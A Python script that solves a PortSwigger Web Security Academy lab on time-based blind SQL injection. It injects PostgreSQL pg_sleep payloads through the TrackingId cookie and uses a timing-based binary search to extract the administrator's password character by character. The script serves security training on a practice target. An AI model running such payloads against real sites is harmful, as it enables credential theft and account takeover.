import requests
import time

# This script was made for solving this lab: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
# Essentially the time delay version of the conditional errors one for a different kind of db. Equally dirty. 
# To use, ensure the domain is correct. They spin up a vm for each lab, so the 0a14005504f16d63807bf81500060000
# part will be different.
# If it doesn't work, try making the sleep time longer depending on the normal request time you are getting.

domain = "0a14005504f16d63807bf81500060000.web-security-academy.net"
url = f"https://{domain}"
val = "asdf"

with requests.Session() as s:
    r = s.get(url)
    if "academyLabBanner" not in r.text:
        print("No active vm. Change url please sir.")
    else:
        password = ""
        count = 0 # debug - just in case we make bad logic and get into an infinite loop
        letter_num = 1
        next_letter = ""

        while len(password) < 20 and count < 10000:
            left_letter = '/' # ascii char just before 0
            right_letter = '{' # ascii char just after z

            while ord(right_letter) - ord(left_letter) > 1 and count < 1000:
                count += 1

                print(".") # just so you know it's alive

                if ord(right_letter) - ord(left_letter) == 3: # we have narrowed it down to 2 possible letters. See which one it is
                    injection = f"asdf'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{letter_num},1)='{chr(ord(left_letter)+1)}') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator') --"
                    s.cookies.set('TrackingId', None)
                    s.cookies.set('TrackingId', injection, domain=domain)

                    start_time = time.time()
                    r = s.get(url)
                    delta_time = time.time() - start_time

                    if (delta_time > 1):
                        next_letter = chr(ord(left_letter)+1)
                    else:
                        next_letter = chr(ord(right_letter)-1)

                    break
                else: # we are still trying to narrow the gap
                    halfway = chr(((ord(right_letter) - ord(left_letter))//2) + ord(left_letter))
                    injection = f"asdf'||(SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{letter_num},1)>'{halfway}') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator') --"
                    s.cookies.set('TrackingId', None)
                    s.cookies.set('TrackingId', injection, domain=domain)

                    start_time = time.time()
                    r = s.get(url)
                    delta_time = time.time() - start_time

                    if (delta_time > 1):
                        left_letter = chr(ord(halfway) - 1)
                    else:
                        right_letter = chr(ord(halfway) + 1)

            password += next_letter
            print(f"password progress: {password}")
            letter_num += 1
            
        print(f"password: {password}")